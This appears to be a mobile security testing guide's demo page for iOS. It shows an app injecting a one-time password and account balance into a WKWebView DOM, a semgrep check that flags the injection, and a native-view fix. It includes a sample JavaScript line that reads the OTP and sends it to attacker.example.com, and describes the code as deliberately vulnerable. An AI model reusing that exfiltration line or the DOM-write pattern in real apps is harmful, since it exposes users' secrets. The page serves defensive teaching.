---
platform: ios
title: Sensitive Data Written into WebView DOM via evaluateJavaScript
code: [swift]
id: MASTG-DEMO-0x05
test: MASTG-TEST-0x05
kind: fail
---

## Sample

This sample loads a `WKWebView` page with placeholder `<div>` elements and then injects a one-time password and an account balance directly into those elements using `evaluateJavaScript` with `textContent` assignments. Because the data lands in the `.page` world, any JavaScript running on the page can read it at any time:

```javascript
// Attacker reads the injected OTP from the DOM
const otp = document.getElementById('otp-display').textContent;
fetch("https://attacker.example.com/?otp=" + otp);
```

{{ MastgTest.swift }}

## Steps

Let's run the semgrep rule against the sample code.

{{ ../../../../rules/mastg-ios-evaluate-javascript-dom-write.yaml }}

{{ run.sh }}

## Observation

The rule identified two instances in the code where `evaluateJavaScript` is called with a `textContent` assignment in the JavaScript string.

{{ output.txt }}

## Evaluation

The test case fails because the app writes sensitive data into DOM elements using `evaluateJavaScript:completionHandler:`.

1. Line 41: injects the one-time password `'482910'` into `#otp-display` via `textContent`.
2. Line 48: injects the account balance `'$4,200.00'` into `#balance-display` via `textContent`.

Both values are written into the `.page` world and can be read by any script running on the page. In a real app, these values would come from native data sources (for example, an authentication server or a backend API) and would be interpolated into the JavaScript string before evaluation, making them equally readable by page JavaScript once injected.

The safe alternative is to display these values using a native `UILabel` or other UIKit view rendered over the `WKWebView`, following the pattern in @MASTG-BEST-0x02. The app reads only layout coordinates from the DOM in an isolated `WKContentWorld`, positions a native view at those coordinates, and sets the sensitive text on the native view — keeping the data entirely outside the DOM
